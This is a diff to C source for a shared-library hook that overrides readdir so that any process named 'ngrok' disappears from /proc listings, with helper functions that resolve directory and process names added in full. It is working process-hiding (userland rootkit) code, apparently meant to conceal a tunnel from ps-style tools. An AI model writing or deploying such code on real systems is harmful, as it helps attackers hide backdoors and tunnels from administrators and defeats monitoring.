@@ -7,7 +7,7 @@
 #include <unistd.h>
 
 /*
- * Every process with these names will be excluded
+ * Every process with this name will be excluded
  */
 static const char* processes_to_filter[] = {
     "ngrok",
@@ -17,12 +17,52 @@ static const char* processes_to_filter[] = {
 /*
  * Get a directory name given a DIR* handle
  */
-// (Same implementation as before)
+static int get_dir_name(DIR* dirp, char* buf, size_t size)
+{
+    int fd = dirfd(dirp);
+    if(fd == -1) {
+        return 0;
+    }
+
+    char tmp[64];
+    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
+    ssize_t ret = readlink(tmp, buf, size);
+    if(ret == -1) {
+        return 0;
+    }
+
+    buf[ret] = 0;
+    return 1;
+}
 
 /*
  * Get a process name given its pid
  */
-// (Same implementation as before)
+static int get_process_name(char* pid, char* buf)
+{
+    if(strspn(pid, "0123456789") != strlen(pid)) {
+        return 0;
+    }
+
+    char tmp[256];
+    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
+ 
+    FILE* f = fopen(tmp, "r");
+    if(f == NULL) {
+        return 0;
+    }
+
+    if(fgets(tmp, sizeof(tmp), f) == NULL) {
+        fclose(f);
+        return 0;
+    }
+
+    fclose(f);
+
+    int unused;
+    sscanf(tmp, "%d (%[^)]s", &unused, buf);
+    return 1;
+}
 
 #define DECLARE_READDIR(dirent, readdir)                                \
 static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
@@ -39,7 +79,7 @@ struct dirent* readdir(DIR *dirp)                                       \
                                                                         \
     struct dirent* dir;                                                 \
                                                                         \
-    while(1)                                                            \
+   while(1)                                                            \
     {                                                                   \
         dir = original_##readdir(dirp);                                 \
         if(dir) {                                                       \
